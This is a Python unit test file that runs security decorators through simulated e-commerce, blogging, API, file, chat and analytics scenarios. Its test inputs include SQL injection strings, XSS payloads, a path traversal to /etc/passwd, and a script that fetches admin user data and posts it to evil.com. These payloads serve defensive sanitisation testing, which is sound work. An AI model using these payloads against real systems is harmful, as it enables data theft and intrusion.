"""
Real-world scenario tests for safe_execute and secure_execute decorators.
Tests complex, realistic use cases that mirror actual production environments.
"""

import unittest
import logging
import time
import io
import json
import hashlib
import uuid
from unittest.mock import patch, MagicMock
from safe_execute import safe_execute, secure_execute

class TestRealWorldScenarios(unittest.TestCase):
    def setUp(self):
        # Capture log output for testing
        self.log_capture = io.StringIO()
        self.handler = logging.StreamHandler(self.log_capture)
        logging.getLogger().addHandler(self.handler)
        logging.getLogger().setLevel(logging.INFO)

    def tearDown(self):
        logging.getLogger().removeHandler(self.handler)
        self.log_capture.close()

    # === E-COMMERCE SCENARIOS ===
    
    def test_payment_processing_system(self):
        """Test complete payment processing with multiple security layers"""
        # Simulate external payment gateway
        class PaymentGateway:
            @staticmethod
            def charge_card(card_number, amount, cvv):
                if len(card_number) != 16:
                    raise ValueError("Invalid card number length")
                if amount <= 0:
                    raise ValueError("Invalid amount")
                return {"transaction_id": str(uuid.uuid4()), "status": "approved"}
        
        gateway = PaymentGateway()
        
        @safe_execute(custom_message="Payment processing failed", 
                     finally_callback=lambda: print("Payment session closed"))
        @secure_execute(
            auto_sanitize=True,
            auto_heal=True,
            rate_limit=5,  # Max 5 payments per minute per function
            security_level="HIGH"
        )
        def process_payment(card_number, amount, cvv, customer_email):
            """Production-grade payment processing function"""
            # Input validation
            if not card_number or not cvv or not customer_email:
                raise ValueError("Missing required payment information")
            
            # Sanitization check - after auto_sanitize, dangerous chars should be removed
            sanitized_card = str(card_number).replace("'", "").replace(";", "").replace("-", "")
            
            # Process payment with sanitized data
            result = gateway.charge_card(sanitized_card.ljust(16, '0')[:16], amount, cvv)
            
            return {
                "success": True,
                "transaction_id": result["transaction_id"],
                "amount": amount,
                "customer": customer_email,
                "timestamp": time.time()
            }
        
        # Test normal payment
        result = process_payment("1234567890123456", 99.99, "123", "customer@test.com")
        self.assertIsNotNone(result)
        self.assertTrue(result["success"])
        self.assertEqual(result["amount"], 99.99)
        
        # Test payment with malicious card number (SQL injection attempt)
        malicious_card = "1234567890123456'; DROP TABLE payments; --"
        result = process_payment(malicious_card, 50.00, "456", "hacker@evil.com")
        # Auto-sanitization should clean the input, function should work
        self.assertIsNotNone(result)
        
        # Test rate limiting - try to exceed 5 payments
        for i in range(6):
            result = process_payment("1234567890123456", 10.00, "123", f"user{i}@test.com")
            if i < 5:
                self.assertIsNotNone(result)
            else:
                self.assertIsNone(result)  # 6th payment should be rate limited

    def test_user_registration_with_sanitization(self):
        """Test user registration with automatic input sanitization"""
        # Simulate user database
        user_db = {}
        
        @safe_execute()
        @secure_execute(auto_sanitize=True, learning_mode=True)
        def register_user(username, email, bio=""):
            """User registration with profile data processing"""
            # Check if user exists
            if username in user_db:
                raise ValueError(f"Username '{username}' already exists")
            
            # Validate email format (basic)
            if "@" not in email or "." not in email:
                raise ValueError("Invalid email format")
            
            # Process bio - after sanitization, dangerous content should be removed
            processed_bio = bio[:500] if bio else ""  # Limit length
            
            # Create user
            user_id = str(uuid.uuid4())
            user_db[username] = {
                "id": user_id,
                "username": username,
                "email": email,
                "bio": processed_bio,
                "created_at": time.time()
            }
            
            return {"user_id": user_id, "username": username, "status": "created"}
        
        # Test normal registration
        result = register_user("johndoe", "john@example.com", "Software developer from NYC")
        self.assertIsNotNone(result)
        self.assertEqual(result["username"], "johndoe")
        self.assertIn("johndoe", user_db)
        
        # Test registration with XSS attempt in bio - should be sanitized
        result = register_user("janedoe", "jane@example.com", 
                              "Hello! <script>document.location='http://evil.com'</script>")
        self.assertIsNotNone(result)
        
        # Verify user was created (bio was sanitized by secure_execute)
        self.assertIn("janedoe", user_db)

    # === CONTENT MANAGEMENT SCENARIOS ===
    
    def test_blog_post_with_content_sanitization(self):
        """Test blog post creation with automatic content sanitization"""
        # Simulate blog database
        blog_db = {}
        
        @safe_execute(custom_message="Blog post operation failed")
        @secure_execute(auto_sanitize=True, rate_limit=10)
        def create_blog_post(author_id, title, content, tags_str=""):
            """Create blog post with content security"""
            if not title.strip():
                raise ValueError("Title cannot be empty")
            
            if len(content) < 50:
                raise ValueError("Content too short (minimum 50 characters)")
            
            # Process tags from comma-separated string
            tags = [tag.strip() for tag in tags_str.split(",") if tag.strip()]
            
            # Create post
            post_id = str(uuid.uuid4())
            blog_db[post_id] = {
                "id": post_id,
                "author_id": author_id,
                "title": title,
                "content": content,
                "tags": tags,
                "created_at": time.time(),
                "view_count": 0
            }
            
            return {"post_id": post_id, "status": "created"}
        
        # Test normal blog post
        result = create_blog_post(
            "user123",
            "My First Blog Post",
            "This is a wonderful blog post about Python security. " * 3,  # Make it long enough
            "python,security,coding"
        )
        self.assertIsNotNone(result)
        
        # Test blog post with malicious content - should be auto-sanitized
        malicious_content = """
        This is my blog post about security.
        <script>fetch('/admin/users').then(r => r.json()).then(data => {
            fetch('http://evil.com/steal', {method: 'POST', body: JSON.stringify(data)});
        });</script>
        Here's some legitimate content about security.
        Hope you enjoyed reading!
        """
        
        result = create_blog_post(
            "user456",
            "Security Tips",  # Title will be sanitized if needed
            malicious_content,
            "security,tips"
        )
        
        self.assertIsNotNone(result)
        # Verify post was created (content was sanitized by secure_execute)
        self.assertIn(result["post_id"], blog_db)

    # === API INTEGRATION SCENARIOS ===
    
    def test_api_endpoint_with_comprehensive_protection(self):
        """Test API endpoint with full security stack"""
        # Simulate API responses
        processed_requests = []
        
        @safe_execute(custom_message="API request failed")
        @secure_execute(
            auto_sanitize=True,
            auto_heal=True,
            rate_limit=20,
            security_level="HIGH",
            learning_mode=True
        )
        def api_process_request(endpoint, payload, user_token=""):
            """Comprehensive API request processor"""
            if not endpoint.startswith("/api/"):
                raise ValueError("Invalid endpoint")
            
            if not payload:
                raise ValueError("Payload required")
            
            # Process request (after sanitization by secure_execute)
            request_id = str(uuid.uuid4())
            processed_requests.append({
                "id": request_id,
                "endpoint": endpoint,
                "payload": payload,
                "user_token": user_token,
                "processed_at": time.time()
            })
            
            return {
                "request_id": request_id,
                "status": "processed",
                "endpoint": endpoint,
                "payload_length": len(str(payload))
            }
        
        # Test normal API request
        result = api_process_request("/api/users", "normal data", "valid_token_123")
        self.assertIsNotNone(result)
        self.assertEqual(result["status"], "processed")
        
        # Test API request with malicious payload
        malicious_payload = "'; DROP TABLE api_logs; -- <script>steal()</script>"
        result = api_process_request("/api/data", malicious_payload, "token_456")
        self.assertIsNotNone(result)  # Should work after sanitization
        
        # Verify requests were processed
        self.assertGreaterEqual(len(processed_requests), 2)

    # === FILE PROCESSING SCENARIOS ===
    
    def test_secure_file_processing(self):
        """Test file processing with path sanitization"""
        # Simulate file operations
        processed_files = {}
        
        @safe_execute()
        @secure_execute(auto_sanitize=True, security_level="HIGH")
        def process_file_operation(operation, file_path, content=""):
            """Secure file processing with path validation"""
            allowed_operations = ["read", "write", "list"]
            if operation not in allowed_operations:
                raise ValueError(f"Operation must be one of: {allowed_operations}")
            
            # After sanitization, dangerous path traversal should be removed
            safe_path = file_path.replace("//", "/")  # Basic normalization
            
            if operation == "write":
                processed_files[safe_path] = {
                    "content": content,
                    "size": len(content),
                    "created_at": time.time()
                }
                return {"status": "written", "path": safe_path, "size": len(content)}
            
            elif operation == "read":
                if safe_path in processed_files:
                    return {"status": "read", "content": processed_files[safe_path]["content"]}
                else:
                    raise FileNotFoundError(f"File not found: {safe_path}")
            
            elif operation == "list":
                return {"status": "listed", "files": list(processed_files.keys())}
        
        # Test normal file operations
        result = process_file_operation("write", "/data/document.txt", "Normal content")
        self.assertIsNotNone(result)
        self.assertEqual(result["status"], "written")
        
        # Test with path traversal attempt - should be sanitized
        result = process_file_operation("write", "../../../etc/passwd", "malicious content")
        self.assertIsNotNone(result)  # Should work after path sanitization
        
        # Test file listing
        result = process_file_operation("list", "/any/path")
        self.assertIsNotNone(result)
        self.assertIn("files", result)

    # === PERFORMANCE TESTS ===
    
    def test_high_volume_processing(self):
        """Test high-volume processing with security overhead"""
        @safe_execute()
        @secure_execute(auto_sanitize=True, rate_limit=100)
        def bulk_data_processor(data_batch):
            """Process batch of data with security protection"""
            processed_count = 0
            for item in data_batch:
                if item and len(str(item)) > 0:
                    processed_count += 1
            
            return {"processed": processed_count, "total": len(data_batch)}
        
        # Create test data with mix of normal and potentially malicious content
        test_batch = [
            "normal_data_1",
            "normal_data_2", 
            "'; DROP TABLE test; --",  # Will be sanitized
            "<script>alert('test')</script>",  # Will be sanitized
            "normal_data_3",
            "../../../etc/passwd",  # Will be sanitized
        ]
        
        # Process batch
        start_time = time.time()
        result = bulk_data_processor(test_batch)
        elapsed = time.time() - start_time
        
        # Verify processing completed
        self.assertIsNotNone(result)
        self.assertEqual(result["total"], 6)
        self.assertGreater(result["processed"], 0)
        
        # Verify reasonable performance (should complete quickly)
        self.assertLess(elapsed, 1.0)

    # === REAL-TIME CHAT SCENARIO ===
    
    def test_chat_message_processing(self):
        """Test real-time chat message processing with security"""
        # Simulate chat room
        chat_rooms = {}
        
        @safe_execute()
        @secure_execute(auto_sanitize=True, rate_limit=60)  # 1 message per second
        def send_chat_message(room_id, user_id, message, message_type="text"):
            """Process chat message with security and rate limiting"""
            if room_id not in chat_rooms:
                chat_rooms[room_id] = {"messages": [], "users": set()}
            
            # Add user to room
            chat_rooms[room_id]["users"].add(user_id)
            
            # Validate message
            if not message.strip():
                raise ValueError("Message cannot be empty")
            
            if len(message) > 1000:
                raise ValueError("Message too long")
            
            # Process different message types
            processed_message = message
            if message_type == "text":
                # Basic text processing
                pass
            elif message_type == "code":
                # Code blocks might contain technical terms that look like SQL
                # but are legitimate, so be less aggressive
                pass
            
            # Create message object
            message_obj = {
                "id": str(uuid.uuid4()),
                "room_id": room_id,
                "user_id": user_id,
                "content": processed_message,
                "type": message_type,
                "timestamp": time.time()
            }
            
            # Store message
            chat_rooms[room_id]["messages"].append(message_obj)
            
            return {
                "message_id": message_obj["id"],
                "status": "sent",
                "room_users_count": len(chat_rooms[room_id]["users"])
            }
        
        # Test normal chat message
        result = send_chat_message("room1", "user1", "Hello everyone!", "text")
        self.assertIsNotNone(result)
        self.assertEqual(result["status"], "sent")
        
        # Test XSS attempt in chat
        result = send_chat_message(
            "room1", 
            "hacker", 
            "Check this out: <script>document.cookie='hacked'</script>", 
            "text"
        )
        self.assertIsNotNone(result)
        
        # Verify XSS was sanitized
        messages = chat_rooms["room1"]["messages"]
        last_message = messages[-1]
        self.assertNotIn("<script>", last_message["content"])
        
        # Test code message (should be less aggressively sanitized)
        code_message = """
        Here's a SQL query example:
        SELECT * FROM users WHERE status = 'active';
        DROP TABLE temp_data;  -- This is just a comment in code
        """
        
        result = send_chat_message("room1", "dev1", code_message, "code")
        self.assertIsNotNone(result)

    # === ANALYTICS AND REPORTING SCENARIO ===
    
    def test_analytics_data_processing(self):
        """Test analytics data processing with large datasets"""
        @safe_execute()
        @secure_execute(auto_sanitize=True, learning_mode=True)
        def process_analytics_data(events, filters=None):
            """Process analytics events with security filtering"""
            if not events or not isinstance(events, list):
                raise ValueError("Events must be a non-empty list")
            
            processed_events = []
            filters = filters or {}
            
            for event in events:
                # Validate event structure
                required_fields = ["timestamp", "user_id", "event_type", "data"]
                if not all(field in event for field in required_fields):
                    continue  # Skip invalid events
                
                # Apply filters
                if filters.get("event_type") and event["event_type"] != filters["event_type"]:
                    continue
                
                if filters.get("min_timestamp") and event["timestamp"] < filters["min_timestamp"]:
                    continue
                
                # Sanitize event data
                sanitized_event = {
                    "timestamp": event["timestamp"],
                    "user_id": event["user_id"],
                    "event_type": event["event_type"],
                    "data": event["data"]
                }
                
                processed_events.append(sanitized_event)
            
            # Generate summary
            summary = {
                "total_events": len(processed_events),
                "event_types": list(set(e["event_type"] for e in processed_events)),
                "unique_users": len(set(e["user_id"] for e in processed_events)),
                "time_range": {
                    "start": min(e["timestamp"] for e in processed_events) if processed_events else None,
                    "end": max(e["timestamp"] for e in processed_events) if processed_events else None
                }
            }
            
            return {
                "events": processed_events,
                "summary": summary,
                "processed_at": time.time()
            }
        
        # Test normal analytics processing
        events = [
            {"timestamp": 1234567890, "user_id": "user1", "event_type": "page_view", "data": {"page": "/home"}},
            {"timestamp": 1234567891, "user_id": "user2", "event_type": "click", "data": {"element": "button"}},
            {"timestamp": 1234567892, "user_id": "user1", "event_type": "page_view", "data": {"page": "/about"}},
        ]
        
        result = process_analytics_data(events)
        self.assertIsNotNone(result)
        self.assertEqual(result["summary"]["total_events"], 3)
        self.assertEqual(result["summary"]["unique_users"], 2)
        
        # Test with malicious event data
        malicious_events = [
            {
                "timestamp": 1234567893, 
                "user_id": "'; DROP TABLE analytics; --", 
                "event_type": "malicious", 
                "data": {"payload": "<script>steal_data()</script>"}
            }
        ]
        
        result = process_analytics_data(malicious_events)
        self.assertIsNotNone(result)
        # Data should be sanitized
        if result["events"]:
            event = result["events"][0]
            self.assertNotIn("DROP", event["user_id"])
            self.assertNotIn("<script>", str(event["data"]))

if __name__ == "__main__":
    unittest.main()
